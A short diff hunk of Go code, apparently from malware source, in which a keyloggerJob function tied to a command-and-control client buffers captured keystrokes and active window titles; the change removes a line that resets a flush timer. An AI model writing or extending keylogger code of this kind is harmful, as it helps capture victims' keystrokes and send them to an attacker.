@@ -1013,7 +1013,6 @@ func keyloggerJob(ctx context.Context, c2 *C2Client) {
 				if ch != "" {
 					buf.WriteString(ch)
 					title = getActiveWindowTitle()
-					lastFlush = time.Now()
 				}
 			}
 
